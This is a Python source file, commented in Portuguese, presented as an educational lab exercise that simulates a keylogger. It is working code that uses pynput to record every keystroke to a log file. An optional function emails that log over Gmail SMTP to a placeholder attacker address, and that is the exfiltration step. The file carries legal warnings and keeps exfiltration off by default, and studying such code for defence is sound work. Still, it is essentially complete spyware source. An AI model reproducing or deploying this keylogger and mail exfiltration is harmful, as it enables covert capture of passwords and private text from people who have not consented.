#!/usr/bin/env python3
# =============================================================================
#  keylogger.py  —  SIMULAÇÃO EDUCACIONAL (Desafio DIO)
#  "Simulando um Malware de Captura de Dados Simples em Python"
#
#  AVISO IMPORTANTE
#  Código estritamente EDUCACIONAL. Deve ser executado APENAS em ambiente
#  100% controlado (sua própria máquina / VM de laboratório), com o objetivo
#  de ENTENDER como a ameaça funciona e aprender a se DEFENDER dela.
#  Capturar dados de terceiros sem consentimento é CRIME no Brasil
#  (Lei 12.737/2012 - "Lei Carolina Dieckmann").
#
#  Dependência:  pip install pynput
#  Execução:     python keylogger.py      (pressione ESC para encerrar)
# =============================================================================

from pynput import keyboard
from datetime import datetime
import smtplib
from email.mime.text import MIMEText

# ------------------------------ Configuração ---------------------------------
ARQUIVO_LOG      = "log.txt"     # arquivo onde as teclas são gravadas
ENVIAR_EMAIL     = False         # True = simula a exfiltração por e-mail (lab)
TECLAS_POR_LOTE  = 50            # a cada N teclas, tenta "exfiltrar" o log

# Credenciais de envio (PLACEHOLDERS - preencha SOMENTE em laboratório seu).
# No Gmail é necessário gerar uma "Senha de app" (2FA ligado).
SMTP_SERVIDOR = "smtp.gmail.com"
SMTP_PORTA    = 465
EMAIL_ORIGEM  = "conta_de_teste@gmail.com"
EMAIL_SENHA   = "senha_de_app_aqui"
EMAIL_DESTINO = "atacante@exemplo.com"    # destino simulado do atacante

contador_teclas = 0
# -----------------------------------------------------------------------------


def registrar_tecla(tecla):
    """Grava cada tecla pressionada no arquivo de log."""
    global contador_teclas

    with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
        try:
            # Tecla "normal": letra, número ou símbolo
            f.write(tecla.char)
        except AttributeError:
            # Tecla especial: espaço, enter, shift, tab, etc.
            if tecla == keyboard.Key.space:
                f.write(" ")
            elif tecla == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{tecla}]")

    # Controle do "lote" para a demonstração de exfiltração
    contador_teclas += 1
    if ENVIAR_EMAIL and contador_teclas >= TECLAS_POR_LOTE:
        enviar_por_email()
        contador_teclas = 0


def enviar_por_email():
    """
    DEMONSTRAÇÃO de exfiltração de dados.

    Envia o conteúdo do log para o e-mail do 'atacante'. Serve para ilustrar,
    no estudo, por que a captura local é apenas metade do problema: o dado
    sensível 'vaza' da máquina da vítima para um servidor controlado por outra
    pessoa. É exatamente esse passo que um antivírus/EDR e um firewall de saída
    tentam detectar e bloquear.
    """
    try:
        with open(ARQUIVO_LOG, "r", encoding="utf-8") as f:
            conteudo = f.read()

        msg = MIMEText(conteudo)
        msg["Subject"] = f"[captura] {datetime.now():%Y-%m-%d %H:%M:%S}"
        msg["From"]    = EMAIL_ORIGEM
        msg["To"]      = EMAIL_DESTINO

        with smtplib.SMTP_SSL(SMTP_SERVIDOR, SMTP_PORTA) as servidor:
            servidor.login(EMAIL_ORIGEM, EMAIL_SENHA)
            servidor.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())

        print("[simulacao] Log 'exfiltrado' por e-mail com sucesso.")
    except Exception as e:
        # Sem credenciais reais, a falha aqui é o resultado esperado.
        print(f"[simulacao] Falha no envio (esperado sem credenciais reais): {e}")


def main():
    print("=" * 62)
    print(" KEYLOGGER SIMULADO - DIO  (uso educacional / laboratorio)")
    print(f" Gravando as teclas em: {ARQUIVO_LOG}")
    print(f" Exfiltracao por e-mail: {'LIGADA' if ENVIAR_EMAIL else 'DESLIGADA'}")
    print(" Pressione ESC para encerrar.")
    print("=" * 62)

    with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
        f.write(f"\n===== Sessao iniciada: {datetime.now():%Y-%m-%d %H:%M:%S} =====\n")

    def ao_pressionar(tecla):
        # ESC encerra a captura (freio de segurança para o laboratório)
        if tecla == keyboard.Key.esc:
            with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
                f.write(f"\n===== Sessao encerrada: {datetime.now():%Y-%m-%d %H:%M:%S} =====\n")
            print("\n[+] Encerrado pelo usuario (ESC).")
            return False  # para o listener
        registrar_tecla(tecla)

    # Escuta o teclado de forma bloqueante até o ESC
    with keyboard.Listener(on_press=ao_pressionar) as listener:
        listener.join()


if __name__ == "__main__":
    main()
